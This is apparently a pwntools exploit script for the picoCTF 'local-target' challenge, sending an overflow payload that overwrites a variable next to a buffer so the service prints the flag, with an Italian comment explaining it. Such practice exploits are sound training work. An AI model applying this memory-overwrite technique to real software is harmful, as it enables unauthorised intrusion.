#!/usr/bin/env python3

from pwn import *

exe = ELF("./local-target")
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 51459)

    return r


def main():
    r = conn()
    payload = 'A' * 24 + 'A'    # Modificare la variabile che viene dopo il buffer da 64 a 65
    
    r.sendlineafter('Enter a string: ', payload)
    flag = r.recvlinesS(4)[3]
    print("Flag: " + flag)


if __name__ == "__main__":
    main()
